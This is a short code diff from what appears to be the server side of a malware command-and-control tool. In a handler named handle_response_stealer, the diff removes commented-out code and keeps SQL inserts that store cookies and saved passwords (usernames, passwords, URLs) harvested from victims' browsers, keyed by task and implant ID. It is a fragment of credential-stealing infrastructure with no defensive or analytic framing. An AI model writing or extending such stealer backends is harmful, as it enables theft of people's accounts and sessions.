@@ -231,15 +231,6 @@ def handle_response_stealer():
         tools.executeGenericVar(
             query, [response_data, success, time, task_id])
 
-        #cookie_table = [prof_cook_list, host_key_list, encrypted_value_list]
-        #password_table = [prof_pw_list, username_list, password_list, url_list]
-        # for i in range(len(prof_cook_list)):
-    #     values_cookie += [(task_id, target_implant_id, prof_cook_list[i], host_key_list[i], encrypted_value_list[i])]
-
-    # values_passwords = []
-    # for i in range(len(prof_pw_list)):
-    #     values_passwords += [(task_id, target_implant_id, prof_pw_list[i], username_list[i], password_list[i], url_list[i])]
-
         query_cookies = "INSERT INTO cookies VALUES (%s, %s, %s, %s, %s)"
 
         query_passwords = "INSERT INTO passwords VALUES(%s, %s, %s, %s, %s, %s)" 
